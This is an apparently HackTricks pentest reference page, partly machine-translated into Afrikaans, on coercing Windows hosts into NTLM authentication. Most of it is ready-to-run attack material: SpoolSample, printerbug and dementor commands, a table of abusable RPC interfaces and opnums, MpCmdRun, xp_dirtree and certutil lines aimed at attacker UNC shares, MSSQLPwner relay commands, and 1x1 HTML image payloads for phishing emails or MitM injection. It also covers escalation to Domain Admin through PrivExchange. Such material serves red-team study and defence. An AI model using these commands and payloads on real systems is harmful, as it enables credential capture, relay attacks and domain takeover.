# Forceer NTLM Geprivilegieerde Verifikasie

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is 'n versameling van remote authentication triggers geskryf in C# met die MIDL-compiler om 3rd-party afhanklikhede te vermy.

## Spooler Service Abuse

As die _**Print Spooler**_ diens **geaktiveer** is, kan jy 'n paar reeds bekende AD-credentials gebruik om die Domain Controller se drukkerserver 'n **opdatering** oor nuwe drukkertake te **versoek** en hom eenvoudig te sê om die kennisgewing na 'n sekere stelsel te **stuur**.\
Let wel: wanneer 'n drukker die kennisgewing aan 'n arbitrêre stelsel stuur, moet dit teen daardie stelsel **verifieer**. Daarom kan 'n aanvaller die _**Print Spooler**_ diens laat verifieer teen 'n arbitrêre stelsel, en die diens sal in hierdie verifikasie die **rekenaarrekening gebruik**.

### Vind Windows-bedieners op die domein

Gebruik PowerShell om 'n lys van Windows-masjiene te kry. Bedieners het gewoonlik prioriteit, so kom ons fokus daar:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Vind Spooler services wat luister

Gebruik 'n effens aangepaste @mysmartlogin se (Vincent Le Toux se) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) om te sien of die Spooler Service luister:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Jy kan ook rpcdump.py op Linux gebruik en kyk vir die MS-RPRN Protocol
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Vra die diens om teen 'n ewekansige gasheer te verifieer

Jy kan compile [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
of gebruik [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) of [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) as jy op Linux is
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Kombinasie met Unconstrained Delegation

As 'n aanvaller reeds 'n rekenaar gekompromitteer het met [Unconstrained Delegation](unconstrained-delegation.md), kan die aanvaller die **drukker dwing om teen hierdie rekenaar te autentiseer**. Weens die unconstrained delegation sal die **TGT** van die **rekenaarrekening van die drukker** **gestoor word in** die **geheue** van die rekenaar met unconstrained delegation. Aangesien die aanvaller die gasheer reeds gekompromitteer het, sal hy in staat wees om **retrieve this ticket** en dit te misbruik ([Pass the Ticket](pass-the-ticket.md)).

## RPC dwing verifikasie

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / PrintNightmare-family
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Opnum: 0 RpcAsyncOpenPrinter
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Nota: Hierdie metodes aanvaar parameters wat 'n UNC-pad kan dra (bv. `\\attacker\share`). Wanneer dit verwerk word, sal Windows autentiseer (masjien/gebruiker konteks) na daardie UNC, wat NetNTLM-vaslegging of relay moontlik maak.

### MS-EVEN: ElfrOpenBELW (opnum 9) dwang
- Interface: MS-EVEN oor \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Oproepsignatuur: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effek: die teiken probeer die verskafde rugsteun-logpad oopmaak en autentiseer na die aanvaller-beheerde UNC.
- Praktiese gebruik: dwing Tier 0 bates (DC/RODC/Citrix/etc.) om NetNTLM uit te stuur, en relé dit dan na AD CS endpoints (ESC8/ESC11 scenario's) of ander bevoorregte dienste.

## PrivExchange

Die `PrivExchange` aanval is die gevolg van 'n fout wat gevind is in die **Exchange Server `PushSubscription` feature**. Hierdie funksie laat toe dat die Exchange server deur enige domeingebruiker met 'n mailbox gedwing kan word om te autentiseer by enige kliënt-verskafde gasheer oor HTTP.

Standaard hardloop die **Exchange service as SYSTEM** en kry dit oormatige voorregte (spesifiek, dit het **WriteDacl privileges on the domain pre-2019 Cumulative Update**). Hierdie fout kan uitgebuit word om die **relaying van inligting na LDAP en gevolglik die onttrekking van die domain NTDS database** moontlik te maak. In gevalle waar relaying na LDAP nie moontlik is nie, kan hierdie fout steeds gebruik word om te relé en te autentiseer na ander gasheer binne die domein. Suksesvolle uitbuiting van hierdie aanval gee onmiddellike toegang tot die Domain Admin met enige geverifieerde domeingebruikersrekening.

## Binnen Windows

As jy reeds binne die Windows-masjien is, kan jy Windows dwing om met 'n bediener te verbind met behulp van voorregte rekeninge via:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Of gebruik hierdie ander tegniek: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Dit is moontlik om certutil.exe lolbin (Microsoft-signed binary) te gebruik om NTLM authentication af te dwing:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Deur e-pos

As jy die **e-posadres** van die gebruiker ken wat by 'n masjien aanmeld wat jy wil kompromitteer, kan jy hom net 'n **e-pos met 'n 1x1-beeld** stuur soos
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
en wanneer hy dit oopmaak, sal hy probeer authenticate.

### MitM

As jy 'n MitM attack op 'n rekenaar kan uitvoer en HTML in 'n bladsy kan inject wat hy sal sien, kan jy probeer om 'n beeld soos die volgende in die bladsy te inject:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Ander maniere om NTLM-verifikasie af te dwing en te phish


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack).\
_Onthou dat om NTLMv1 te crack, moet jy die Responder challenge stel na "1122334455667788"_

## Verwysings
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
